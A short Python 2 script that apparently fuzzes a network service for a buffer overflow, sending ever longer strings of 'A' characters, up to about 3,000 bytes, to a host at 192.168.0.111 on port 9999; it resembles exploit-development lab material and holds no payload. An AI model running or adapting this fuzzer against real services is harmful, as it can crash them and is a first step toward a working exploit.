import socket

buffer=["A"]
counter=100
while len(buffer)<=30:
	buffer.append("A"*counter)
	counter=counter+100
try:
	for string in buffer:
		print "fussing with %s bytes" % len(string)
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect=s.connect(('192.168.0.111', 9999))
		s.recv(1024)
		s.send(string + '\r\n')
		s.close()

except:
	print "connection failed"